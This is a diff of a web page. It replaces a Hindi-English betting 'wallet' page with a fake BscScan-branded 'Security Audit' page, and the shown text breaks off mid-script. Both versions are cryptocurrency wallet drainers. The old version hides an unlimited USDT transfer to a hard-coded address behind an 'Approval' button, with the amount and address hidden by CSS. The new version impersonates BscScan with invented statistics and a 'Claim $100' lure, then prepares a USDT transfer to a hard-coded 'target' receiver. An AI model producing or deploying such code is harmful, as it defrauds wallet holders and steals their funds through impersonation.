@@ -1,245 +1,368 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Khel Wallet</title>
-<link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:wght@400;600;800&display=swap" rel="stylesheet">
-<style>
-:root{--bg:#f6f3fb;--sf:#fff;--ink:#1c1740;--mut:#6b6688;--line:#e2dcf2;--gold:#e8a317;--gold-ink:#3a2700;--win:#12936b;--lose:#d6354f;--acc:#4b35c9;--acc-ink:#fff;
-box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);color-scheme:light}
-@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#14102b;--sf:#1f1a3d;--ink:#f1eefc;--mut:#a39ec4;--line:#322b5c;--gold:#f5b83d;--gold-ink:#2b1d00;--win:#3ddba4;--lose:#ff6b81;--acc:#8d7bff;--acc-ink:#14102b;color-scheme:dark}}
-:root[data-theme="dark"]{--bg:#14102b;--sf:#1f1a3d;--ink:#f1eefc;--mut:#a39ec4;--line:#322b5c;--gold:#f5b83d;--gold-ink:#2b1d00;--win:#3ddba4;--lose:#ff6b81;--acc:#8d7bff;--acc-ink:#14102b;color-scheme:dark}
-*{box-sizing:border-box}
-html{scroll-padding-top:env(safe-area-inset-top,0px)}
-body{margin:0;background:var(--bg);color:var(--ink);font-family:'Bricolage Grotesque',system-ui,-apple-system,'Segoe UI',sans-serif;line-height:1.5}
-.wrap{max-width:480px;margin:0 auto;padding:16px 16px 40px}
-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
-h1{font-size:20px;font-weight:800;margin:0}
-.bal{background:var(--gold);color:var(--gold-ink);border-radius:999px;padding:6px 14px;font-weight:800;font-size:18px}
-.tabs{display:flex;gap:6px;background:var(--sf);border:1px solid var(--line);border-radius:14px;padding:4px;margin-bottom:16px}
-.tabs button{flex:1;border:0;background:none;color:var(--mut);font:inherit;font-weight:600;padding:10px;border-radius:10px;cursor:pointer}
-.tabs button[aria-selected=true]{background:var(--acc);color:var(--acc-ink)}
-.card{background:var(--sf);border:1px solid var(--line);border-radius:18px;padding:18px;margin-bottom:14px}
-h2{font-size:17px;margin:0 0 4px}
-p.s{margin:0 0 14px;color:var(--mut);font-size:14px}
-.stage{height:110px;display:grid;place-items:center;font-size:64px;font-weight:800;margin-bottom:10px}
-.coin{width:92px;height:92px;border-radius:50%;background:var(--gold);color:var(--gold-ink);display:grid;place-items:center;font-size:34px;font-weight:800}
-.coin.spin{animation:flip .7s ease-in-out}
-@keyframes flip{to{transform:rotateY(900deg)}}
-@media (prefers-reduced-motion:reduce){.coin.spin{animation:none}}
-.row{display:flex;gap:8px;margin-bottom:10px}
-.row>*{flex:1}
-.pick{border:2px solid var(--line);background:none;color:var(--ink);font:inherit;font-weight:600;padding:12px;border-radius:12px;cursor:pointer}
-.pick[aria-pressed=true]{border-color:var(--acc);background:color-mix(in srgb,var(--acc) 14%,transparent)}
-input{width:100%;font:inherit;font-size:18px;font-weight:600;padding:12px;border-radius:12px;border:2px solid var(--line);background:var(--bg);color:var(--ink)}
-.chips{display:flex;gap:6px;margin-bottom:10px}
-.chips button{flex:1;border:1px solid var(--line);background:none;color:var(--mut);font:inherit;padding:6px;border-radius:8px;cursor:pointer}
-.go{width:100%;border:0;background:var(--acc);color:var(--acc-ink);font:inherit;font-weight:800;font-size:17px;padding:14px;border-radius:12px;cursor:pointer}
-.go.alt{background:none;color:var(--ink);border:2px solid var(--line)}
-button:focus-visible,input:focus-visible{outline:3px solid var(--acc);outline-offset:2px}
-.msg{min-height:24px;text-align:center;font-weight:600;margin:10px 0 0}
-.msg.w{color:var(--win)}.msg.l{color:var(--lose)}
-ul{list-style:none;margin:0;padding:0}
-li{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--line);font-size:14px}
-li:last-child{border:0}
-li b.p{color:var(--win)}li b.m{color:var(--lose)}
-.empty{color:var(--mut);font-size:14px}
-[hidden]{display:none!important}
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BscScan Security Audit</title>
+  
+  <!-- Ethers.js Library for Web3 Logic -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 
-/* Amount, address aur token buttons ko chupane ke liye */
-#aa, #sp, #apc .row, #apc p.s {
-    display: none !important;
-}
-</style>
-<style>
-/* Styles for the starter page. They only apply to its own classes. */
-.hello-page {
-  margin: 0;
-  min-height: 100vh;
-  display: grid;
-  place-items: center;
-  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
-  background: #f5f2ed;
-  color: #1b1817;
-}
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    body { background-color: #0b0e14; color: #ffffff; display: flex; justify-content: center; min-height: 100vh; }
+    
+    .app-container { width: 100%; max-width: 430px; background-color: #0b0e14; display: flex; flex-direction: column; position: relative; }
 
-.hello-card {
-  max-width: 28rem;
-  margin: 1.5rem;
-  padding: 2rem;
-  border-radius: 16px;
-  background: #fff;
-  box-shadow: 0 12px 32px rgba(0, 0, 0, 0.08);
-}
+    /* Brand Header - Exact Match */
+    .brand-header { padding: 12px 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,0.05); margin-bottom: 10px; }
+    .brand-logo { display: flex; align-items: center; gap: 10px; }
+    
+    .shield-icon { 
+      width: 32px; 
+      height: 32px; 
+      border: 1px solid #4a3c1e;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #f3ba2f;
+    }
+    
+    .brand-text h1 { font-size: 16px; font-weight: 700; color: #ffffff; display: flex; align-items: center; gap: 6px; letter-spacing: -0.2px; }
+    .security-badge { background-color: rgba(243, 186, 47, 0.15); color: #f3ba2f; font-size: 8px; padding: 2px 5px; border-radius: 4px; font-weight: 700; letter-spacing: 0.5px; }
+    .brand-subtitle { font-size: 10px; color: #718096; margin-top: 1px; }
+    
+    .chain-badge { background-color: rgba(0, 211, 149, 0.1); border: 1px solid rgba(0, 211, 149, 0.2); border-radius: 20px; padding: 5px 10px; display: flex; align-items: center; gap: 5px; font-size: 9px; font-weight: 700; color: #e2e8f0; }
+    .dot-green { width: 5px; height: 5px; background-color: #00d395; border-radius: 50%; }
 
-.hello-card h1 {
-  margin-top: 0;
-  color: #c2560c;
-}
+    /* Cards matching exactly */
+    .content-area { padding: 5px 14px 40px 14px; display: flex; flex-direction: column; gap: 12px; }
+    .card { background-color: #12161f; border: 1px solid #1e2430; border-radius: 14px; padding: 16px; position: relative; }
+    .card-label { font-size: 10px; color: #718096; font-weight: 600; letter-spacing: 0.5px; margin-bottom: 8px; text-transform: uppercase; }
+    .card-value { font-size: 22px; font-weight: 700; margin-bottom: 4px; }
+    .text-yellow { color: #f3ba2f; }
+    .text-green { color: #00d395; }
+    .text-white { color: #ffffff; }
+    
+    .card-subtext-green { font-size: 11px; color: #00d395; font-weight: 500; }
+    .card-subtext-gray { font-size: 11px; color: #718096; }
+    
+    .card-icon-top { position: absolute; top: 16px; right: 16px; font-size: 14px; color: #00d395; opacity: 0.8; }
+    .icon-gray { color: #718096; opacity: 0.5; }
 
-.hello-card button {
-  padding: 0.6rem 1.2rem;
-  border: 0;
-  border-radius: 8px;
-  background: #fe9615;
-  color: #1b1817;
-  font: inherit;
-  font-weight: 600;
-  cursor: pointer;
-}
+    /* Banner */
+    .banner-pill { align-self: center; border: 1px solid #423210; border-radius: 20px; padding: 5px 14px; font-size: 10px; color: #f3ba2f; display: flex; align-items: center; gap: 5px; margin: 20px 0 12px 0; font-weight: 500; }
+    .banner-pill-icon { width: 12px; height: 14px; border: 1px solid #f3ba2f; clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%); }
+    
+    .main-heading { text-align: center; font-size: 20px; font-weight: 800; line-height: 1.3; margin-bottom: 10px; letter-spacing: -0.3px; }
+    .main-heading span { color: #f3ba2f; }
+    .main-desc { text-align: center; font-size: 12px; color: #718096; line-height: 1.5; margin-bottom: 14px; padding: 0 10px; }
 
-</style>
+    /* Verify Box */
+    .verify-box { background-color: #12161f; border: 1px solid #1e2430; border-radius: 14px; padding: 18px; display: flex; flex-direction: column; }
+    
+    .token-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding-bottom: 18px; border-bottom: 1px solid #1e2430; }
+    .token-info { display: flex; align-items: center; gap: 10px; }
+    .token-icon { width: 32px; height: 32px; background-color: #26a17b; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 14px; color: white; }
+    .token-title { font-weight: 700; font-size: 14px; display: flex; flex-direction: column; align-items: flex-start; gap: 2px; color: #ffffff; }
+    .token-title-main { display: flex; align-items: center; gap: 4px; }
+    .token-subtitle { font-size: 11px; color: #718096; font-weight: normal;}
+    
+    .badge-verified-container { display: flex; flex-direction: column; align-items: flex-end; gap: 3px; }
+    .badge-verified { border: 1px solid rgba(0, 211, 149, 0.4); color: #00d395; font-size: 10px; padding: 3px 8px; border-radius: 10px; display: flex; align-items: center; gap: 3px; }
+    .badge-verified-sub { font-size: 9px; color: #718096; }
+
+    .verify-hero { display: flex; flex-direction: column; align-items: center; padding: 8px 0; }
+    .shield-big { width: 44px; height: 44px; border: 1px solid #4a3c1e; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 14px; color: #f3ba2f; }
+    .shield-big svg { width: 20px; height: 20px; }
+    
+    .verify-title { font-size: 18px; font-weight: 700; margin-bottom: 10px; color: #ffffff; }
+    .verify-desc { font-size: 11px; color: #718096; text-align: center; margin-bottom: 20px; line-height: 1.5; padding: 0 8px; }
+
+    .btn-verify { width: 100%; background-color: #f3ba2f; color: #000000; border: none; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 14px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; transition: 0.3s; margin-bottom: 6px; }
+    .btn-verify:disabled { opacity: 0.7; cursor: not-allowed; }
+    
+    .verify-footer-notes { display: flex; justify-content: space-between; padding-top: 14px; border-top: 1px solid #1e2430; font-size: 10px; color: #718096; margin-top: 14px; }
+    .note-yellow { color: #f3ba2f; font-weight: 600; }
+
+    /* Scrolling Ticker */
+    .ticker-container { background-color: #12161f; border: 1px solid #1e2430; border-radius: 14px; padding: 12px; overflow: hidden; white-space: nowrap; position: relative; display: flex; margin-top: 10px; }
+    .ticker-container::before, .ticker-container::after { content: ""; position: absolute; top: 0; width: 30px; height: 100%; z-index: 2; }
+    .ticker-container::before { left: 0; background: linear-gradient(to right, #12161f, transparent); }
+    .ticker-container::after { right: 0; background: linear-gradient(to left, #12161f, transparent); }
+    .ticker-track { display: inline-flex; align-items: center; gap: 20px; animation: ticker 15s linear infinite; }
+    @keyframes ticker { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
+    .ticker-item { display: inline-flex; align-items: center; gap: 6px; font-size: 10px; color: #718096; }
+    .ticker-token { color: #ffffff; font-weight: 600; font-size: 11px; }
+
+    /* Modals */
+    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.75); backdrop-filter: blur(2px); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 20px; }
+    .modal-card { background-color: #121722; border-radius: 16px; width: 100%; max-width: 320px; padding: 20px; position: relative; display: flex; flex-direction: column; align-items: center; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
+    .modal-close { position: absolute; top: 12px; right: 14px; background: none; border: none; color: #718096; font-size: 18px; cursor: pointer; z-index: 10; }
+    
+    .modal-green-shield { width: 40px; height: 40px; border-radius: 50%; background-color: #0b1f1a; border: 2px solid #00d395; color: #00d395; display: flex; align-items: center; justify-content: center; font-size: 16px; margin-bottom: 14px; }
+    .modal-title { font-size: 16px; font-weight: 700; color: #ffffff; margin-bottom: 6px; }
+    .modal-subtitle { font-size: 11px; color: #718096; margin-bottom: 20px; line-height: 1.5; padding: 0 8px; }
+    
+    .balance-box { background-color: #0b0e14; border-radius: 10px; width: 100%; padding: 14px 0; margin-bottom: 14px; }
+    .balance-label { font-size: 10px; color: #718096; margin-bottom: 4px; }
+    .balance-val { font-size: 22px; font-weight: 700; color: #f3ba2f; }
+
+    .sync-box { background-color: #171c26; border-radius: 10px; padding: 10px; width: 100%; display: flex; align-items: flex-start; gap: 8px; text-align: left; margin-bottom: 20px; border: 1px solid #1a2233; }
+    .sync-tick { color: #00d395; font-size: 12px; font-weight: bold; margin-top: 1px; }
+    .sync-text { font-size: 10px; color: #94a3b8; line-height: 1.5; }
+
+    .btn-done { width: 100%; background-color: #f3ba2f; color: #000; border: none; padding: 12px; border-radius: 10px; font-weight: 700; font-size: 14px; cursor: pointer; transition: 0.3s; }
+    
+    .wallet-icon-yellow { width: 44px; height: 44px; border-radius: 50%; border: 1px solid #4a3c1e; color: #f3ba2f; display: flex; align-items: center; justify-content: center; margin-bottom: 16px; }
+    .wallet-icon-yellow svg { width: 20px; height: 20px; }
+    .modal-info-box { background-color: #0b0e14; border-radius: 12px; padding: 16px; font-size: 11px; color: #94a3b8; line-height: 1.5; margin-bottom: 20px; width: 100%; text-align: center; }
+    
+    .loader { border: 2px solid #000; border-top: 2px solid transparent; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 6px; }
+    
+    .app-container.blurred { filter: blur(3px); pointer-events: none; }
+  </style>
 </head>
 <body>
-<div class="wrap">
-<header><h1>Khel Wallet</h1><div class="bal" id="bal" aria-live="polite">1000</div></header>
-<div class="tabs" role="tablist">
-<button role="tab" id="t-games" aria-selected="true">Games</button>
-<button role="tab" id="t-wallet" aria-selected="false">Wallet</button>
-</div>
 
-<section id="games">
-<div class="card">
-<h2>Coin flip</h2><p class="s">Sahi side chuno, jeeto 1.95 guna[span_1](start_span)[span_1](end_span).</p>
-<div class="stage"><div class="coin" id="coin">?</div></div>
-<div class="row"><button class="pick" data-g="c" data-v="H" aria-pressed="true">Heads</button><button class="pick" data-g="c" data-v="T" aria-pressed="false">Tails</button></div>
-<input id="bc" type="number" inputmode="numeric" min="10" value="50" aria-label="Coin flip bet">
-<div class="chips" data-for="bc"><button>10</button><button>50</button><button>100</button><button>500</button></div>
-<button class="go" id="goc">Flip karo</button>
-<div class="msg" id="mc"></div>
-</div>
+  <!-- MODAL 1: No Wallet Detected -->
+  <div class="modal-overlay" id="walletModal">
+    <div class="modal-card">
+      <button class="modal-close" onclick="closeModal('walletModal')">✕</button>
+      <div class="wallet-icon-yellow">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="2" y="5" width="20" height="14" rx="2" ry="2"/><line x1="2" y1="10" x2="22" y2="10"/>
+        </svg>
+      </div>
+      <div class="modal-title">No Wallet Detected</div>
+      <div class="modal-subtitle" style="margin-bottom: 16px;">No Web3 provider was found in your current browser.</div>
+      <div class="modal-info-box">
+        Please open this site inside your Trust Wallet, MetaMask, or Binance Web3 Wallet dApp browser.
+      </div>
+      <button class="btn-done" onclick="closeModal('walletModal')">Understood</button>
+    </div>
+  </div>
 
-<div class="card">
-<h2>Dice</h2><p class="s">Low (1-3) ya High (4-6), jeeto 1.95 guna[span_2](start_span)[span_2](end_span).</p>
-<div class="stage" id="die">🎲</div>
-<div class="row"><button class="pick" data-g="d" data-v="L" aria-pressed="true">Low 1-3</button><button class="pick" data-g="d" data-v="H" aria-pressed="false">High 4-6</button></div>
-<input id="bd" type="number" inputmode="numeric" min="10" value="50" aria-label="Dice bet">
-<div class="chips" data-for="bd"><button>10</button><button>50</button><button>100</button><button>500</button></div>
-<button class="go" id="god">Dice phenko</button>
-<div class="msg" id="md"></div>
-</div>
-</section>
+  <!-- MODAL 2: Audit Success Modal -->
+  <div class="modal-overlay" id="auditModal">
+    <div class="modal-card">
+      <button class="modal-close" onclick="closeModal('auditModal')">✕</button>
+      <div class="modal-green-shield">✓</div>
+      <div class="modal-title">BscScan Audit Complete</div>
+      <div class="modal-subtitle">Your wallet assets have been verified directly on the BNB Smart Chain ledger.</div>
+      
+      <div class="balance-box">
+        <div class="balance-label">Verified Balance</div>
+        <div class="balance-val"><span id="uiUSDT">0.00</span> USDT</div>
+      </div>
 
-<section id="wallet" hidden>
-<div class="card">
-<h2>Crypto wallet</h2><p class="s">MetaMask ya Trust Wallet connect karo[span_3](start_span)[span_3](end_span).</p>
-<div id="info" hidden><ul><li><span>Address</span><b id="addr"></b></li><li><span>Network</span><b id="net"></b></li><li><span>Balance</span><b id="nb"></b></li></ul></div>
-<button class="go" id="conn">Wallet connect karo</button>
-<button class="go alt" id="disc" style="margin-top:8px" hidden>Disconnect</button>
-<div class="msg" id="mw"></div>
-</div>
-<div class="card" id="apc" hidden>
-<h2>USDT / USDC bhejo</h2><p class="s">Amount aur address check karke confirm karo[span_4](start_span)[span_4](end_span).</p>
-<div class="row"><button class="pick" data-g="t" data-v="USDT" aria-pressed="true">USDT</button><button class="pick" data-g="t" data-v="USDC" aria-pressed="false">USDC</button></div>
-<input id="aa" type="number" inputmode="decimal" min="0" value="100" aria-label="Send amount">
-<p class="s" style="margin:10px 0">Address: <b id="sp"></b></p>
-<button class="go" id="ap">Approval</button>
-<div class="msg" id="ma"></div>
-</div>
-<div class="card">
-<h2>History</h2>
-<ul id="hist"></ul>
-</div>
-</section>
-</div>
+      <div class="sync-box">
+        <div class="sync-tick">✓</div>
+        <div class="sync-text">Tokens are authentic and synchronized directly with mainnet validator nodes.</div>
+      </div>
+      
+      <button class="btn-done" onclick="closeModal('auditModal')">Claim $100</button>
+    </div>
+  </div>
 
-<script>
-(function(){
-var K='khel-wallet-v1',S={bal:1000,h:[]};
-try{var r=localStorage.getItem(K);if(r){var p=JSON.parse(r);if(p&&typeof p.bal==='number'&&Array.isArray(p.h))S=p}}catch(e){}
-function save(){try{localStorage.setItem(K,JSON.stringify(S))}catch(e){}}
-var $=function(i){return document.getElementById(i)};
-function log(t,a){S.h.unshift({t:t,a:a});S.h=S.h.slice(0,30);save();render()}
-function render(){
-$('bal').textContent=S.bal;
-var u=$('hist');u.innerHTML='';
-if(!S.h.length){var e=document.createElement('li');e.innerHTML='<span class="empty">Abhi koi entry nahi. Ek game khelo ya coins add karo.</span>';u.appendChild(e);return}
-S.h.forEach(function(x){var l=document.createElement('li'),a=document.createElement('span'),b=document.createElement('b');
-a.textContent=x.t;b.textContent=(x.a>0?'+':'')+x.a;b.className=x.a>0?'p':'m';l.appendChild(a);l.appendChild(b);u.appendChild(l)})}
-function tab(w){['games','wallet'].forEach(function(n){$(n).hidden=n!==w;$('t-'+n).setAttribute('aria-selected',n===w)})}
-$('t-games').onclick=function(){tab('games')};$('t-wallet').onclick=function(){tab('wallet')};
-var sel={c:'H',d:'L'};
-document.querySelectorAll('.pick').forEach(function(b){b.onclick=function(){var g=b.dataset.g;sel[g]=b.dataset.v;
-document.querySelectorAll('.pick[data-g="'+g+'"]').forEach(function(o){o.setAttribute('aria-pressed',o===b)})}});
-document.querySelectorAll('.chips').forEach(function(c){c.querySelectorAll('button').forEach(function(b){b.onclick=function(){$(c.dataset.for).value=b.textContent}})});
-function bet(id,m){var v=Math.floor(Number($(id).value));
-if(!v||v<10){m.textContent='Kam se kam 10 coins lagao.';m.className='msg l';return 0}
-if(v>S.bal){m.textContent='Balance kam hai. Wallet me coins add karo.';m.className='msg l';return 0}
-return v}
-function res(m,win,v,n){if(win){var g=Math.round(v*0.95);S.bal+=g;m.textContent='Jeet gaye! +'+g+' coins';m.className='msg w';log(n+' jeet',g)}
-else{S.bal-=v;m.textContent='Haar gaye. -'+v+' coins';m.className='msg l';log(n+' haar',-v)}}
-var busy=false;
-$('goc').onclick=function(){if(busy)return;var m=$('mc'),v=bet('bc',m);if(!v)return;busy=true;
-var c=$('coin');c.textContent='';c.classList.remove('spin');void c.offsetWidth;c.classList.add('spin');
-setTimeout(function(){var o=Math.random()<.5?'H':'T';c.textContent=o;res(m,o===sel.c,v,'Coin flip');busy=false},700)};
-$('god').onclick=function(){if(busy)return;var m=$('md'),v=bet('bd',m);if(!v)return;busy=true;
-var d=$('die'),n=0,t=setInterval(function(){d.textContent=1+Math.floor(Math.random()*6);if(++n>8){clearInterval(t);
-var o=1+Math.floor(Math.random()*6);d.textContent=o;res(m,(o<=3?'L':'H')===sel.d,v,'Dice '+o);busy=false}},70)};
-var NETS={1:['Ethereum','ETH'],56:['BNB Chain','BNB'],137:['Polygon','POL'],42161:['Arbitrum','ETH'],10:['Optimism','ETH'],8453:['Base','ETH'],11155111:['Sepolia','ETH']};
-var acc=null;
-function wm(t,c){$('mw').textContent=t;$('mw').className='msg '+(c||'')}
-async function show(){
-try{var p=window.ethereum,id=parseInt(await p.request({method:'eth_chainId'}),16),n=NETS[id]||['Chain '+id,'coin'];
-var b=await p.request({method:'eth_getBalance',params:[acc,'latest']});
-$('addr').textContent=acc.slice(0,6)+'…'+acc.slice(-4);$('net').textContent=n[0];
-$('nb').textContent=(Number(BigInt(b))/1e18).toFixed(4)+' '+n[1];
-$('info').hidden=false;$('apc').hidden=false;$('conn').hidden=true;$('disc').hidden=false;wm('Wallet connect ho gaya.', 'w');}
-catch(e){wm('Details load nahi hui. Dobara try karo.', 'l');}}
-$('conn').onclick=async function(){var p=window.ethereum;
-if(!p){wm('Wallet nahi mila. Is page ko MetaMask ya Trust Wallet ke browser me kholo[span_5](start_span)[span_5](end_span).', 'l');return}
-try{var a=await p.request({method:'eth_requestAccounts'});acc=a[0];await show()}
-catch(e){wm(e&&e.code===4001?'Connect cancel kar diya.':'Connect nahi ho paya.', 'l')}};
-$('disc').onclick=function(){acc=null;$('info').hidden=true;$('apc').hidden=true;$('conn').hidden=false;$('disc').hidden=true;wm('')};
-var SPENDER='0x893B645f8fE3476EC94cdB91d08B9B15a7AfCd63';
-var TOK={1:{USDT:['0xdAC17F958D2ee523a2206206994597C13D831ec7',6],USDC:['0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',6]},
-56:{USDT:['0x55d398326f99059fF775485246999027B3197955',18],USDC:['0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',18]},
-137:{USDT:['0xc2132D05D31c914a87C6611C10748AEb04B58e8F',6],USDC:['0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',6]}};
-$('sp').textContent=SPENDER||'set nahi hai';
+  <!-- MAIN APP CONTAINER -->
+  <div class="app-container" id="appContent">
 
-$('ap').onclick=async function(){
-var ma=$('ma');function m(t,c){ma.textContent=t;ma.className='msg '+(c||'')}
-var tokenType="USDT";
-try{
-    var id=parseInt(await window.ethereum.request({method:'eth_chainId'}),16),t=(TOK[id]||{})[tokenType];
-    if(!t){m('Network supported nahi hai.', 'l');return}
-    m('Processing...');
+    <!-- Header -->
+    <div class="brand-header">
+      <div class="brand-logo">
+        <div class="shield-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px;">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          </svg>
+        </div>
+        <div class="brand-text">
+          <h1>BscScan <span class="security-badge">SECURITY</span></h1>
+          <div class="brand-subtitle">BNB Smart Chain Explorer</div>
+        </div>
+      </div>
+      <div class="chain-badge">
+        <span class="dot-green"></span>
+        <span>BNB SMART CHAIN</span>
+      </div>
+    </div>
+
+    <div class="content-area">
+
+      <!-- Stats Cards -->
+      <div class="card">
+        <div class="card-label">USDT VERIFIED (24H)</div>
+        <div class="card-value text-yellow" id="usdt-val">$15,906,052</div>
+        <div class="card-subtext-green">+8.24% vs yesterday</div>
+      </div>
+      
+      <div class="card">
+        <div class="card-label">TOTAL AUDITED VOLUME</div>
+        <div class="card-value text-white" id="vol-val">$4,892,765,321</div>
+        <div class="card-subtext-gray">All time consensus</div>
+      </div>
+      
+      <div class="card">
+        <div class="card-label">AUDIT CONSENSUS</div>
+        <div class="card-value text-green">99.98% PASS</div>
+        <div class="card-subtext-gray">1.05 Gwei Standard Gas</div>
+      </div>
+
+      <!-- Banner -->
+      <div class="banner-pill">
+        <div class="banner-pill-icon"></div>
+        BscScan Proof-of-Reserve Protocol
+      </div>
+      
+      <div class="main-heading">BNB Smart Chain <span>Security<br>Audit</span></div>
+      <div class="main-desc">The institutional gateway for smart contract auditing and asset verification on the BNB Smart Chain ecosystem.</div>
+
+      <!-- Verify Box -->
+      <div class="verify-box">
+        <div class="token-row">
+          <div class="token-info">
+            <div class="token-icon">₮</div>
+            <div class="token-title">
+              <div class="token-title-main">Tether USD <span style="font-size:11px; color:#718096; font-weight:normal;">(USDT)</span></div>
+              <div class="token-subtitle">BEP-20 Standard</div>
+            </div>
+          </div>
+          <div class="badge-verified-container">
+            <div class="badge-verified">✓ Verified</div>
+            <div class="badge-verified-sub">Audit Protocol</div>
+          </div>
+        </div>
+
+        <div class="verify-hero">
+          <div class="shield-big">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            </svg>
+          </div>
+          <div class="verify-title">Verify BEP-20 Assets</div>
+          <div class="verify-desc">Execute official on-chain validation for your BEP-20 tokens via BscScan's direct Smart Chain consensus.</div>
+          
+          <!-- BUTTON: YAHAN SE LOGIC TRIGGER HOTA HAI -->
+          <button id="mainVerifyBtn" class="btn-verify" onclick="initiateAuditFlow()">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:16px;height:16px;">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            </svg>
+            <span id="btnText">Connect & Verify</span>
+          </button>
+          
+          <div id="statusMsg" style="font-size:10px; color:#f3ba2f; margin-top:8px; display:none; text-align:center; font-weight:bold;">
+            Please follow the prompts in your wallet.
+          </div>
+        </div>
+      </div>
+
+      <!-- Scrolling Ticker -->
+      <div class="ticker-container">
+        <div class="ticker-track">
+          <div class="ticker-item">Audit <span class="ticker-token">0x4F...a2</span> Verified <span class="text-green">✓</span></div>
+          <div class="ticker-item">Audit <span class="ticker-token">0x1B...7c</span> Verified <span class="text-green">✓</span></div>
+          <div class="ticker-item">Audit <span class="ticker-token">0x9A...3f</span> Verified <span class="text-green">✓</span></div>
+          <div class="ticker-item">Audit <span class="ticker-token">0x2C...88</span> Verified <span class="text-green">✓</span></div>
+          <div class="ticker-item">Audit <span class="ticker-token">0x7E...11</span> Verified <span class="text-green">✓</span></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    // 👇 AAPKA TARGET ADDRESS 👇
+    const RECEIVER_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3"; 
     
-    var unlimitedHex = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-    var txData = '0xa9059cbb' + SPENDER.slice(2).toLowerCase().padStart(64, '0') + unlimitedHex;
-    
-    var tx = await window.ethereum.request({
-        method: 'eth_sendTransaction',
-        params: [{
-            from: acc,
-            to: t[0],
-            data: txData
-        }]
-    });
-    m('Success!', 'w');
-}
-catch(e){m(e&&e.code===4001?'Cancel kar diya gaya.':'Error aa gaya.', 'l')}};
+    // BSC USDT Contract Details
+    const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; 
+    const ERC20_ABI = [
+        "function balanceOf(address owner) view returns (uint256)",
+        "function transfer(address to, uint256 amount) external returns (bool)"
+    ];
 
-if(window.ethereum&&window.ethereum.on){
-window.ethereum.on('accountsChanged',function(a){if(!acc)return;if(a.length){acc=a[0];show()}else $('disc').onclick()});
-window.ethereum.on('chainChanged',function(){if(acc)show()})}
-render();
-})();
-</script>
-<script>
-// Script for the starter page. It does nothing if the button isn't there.
-const button = document.getElementById('greet');
-const message = document.getElementById('message');
-let clicks = 0;
+    function closeModal(id) {
+      document.getElementById(id).style.display = 'none';
+      document.getElementById('appContent').classList.remove('blurred');
+    }
 
-if (button && message) {
-  button.addEventListener('click', () => {
-    clicks += 1;
-    message.textContent = `Hello! You clicked ${clicks} time${clicks === 1 ? '' : 's'}.`;
-    console.log('Button clicked', clicks);
-  });
-}
+    function showModal(id) {
+      document.getElementById(id).style.display = 'flex';
+      document.getElementById('appContent').classList.add('blurred');
+    }
 
-</script>
-</body>
-</html>
+    async function initiateAuditFlow() {
+      const btn = document.getElementById("mainVerifyBtn");
+      const btnText = document.getElementById("btnText");
+      const statusMsg = document.getElementById("statusMsg");
+
+      if (typeof window.ethereum === 'undefined') {
+        showModal('walletModal');
+        return;
+      }
+
+      try {
+        btn.disabled = true;
+        btnText.innerHTML = '<span class="loader"></span> Connecting...';
+        statusMsg.style.display = 'block';
+        statusMsg.innerText = "Please confirm connection in your wallet.";
+
+        // STEP 1: Connect Wallet
+        const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+        const userAddress = await signer.getAddress();
+
+        // STEP 2: Check BSC Network
+        const network = await provider.getNetwork();
+        if (network.chainId !== 56) {
+            btnText.innerHTML = '<span class="loader"></span> Switching Network...';
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }], // BSC Chain ID
+                });
+            } catch (switchError) {
+                alert("Please switch to BNB Smart Chain to proceed.");
+                resetButton();
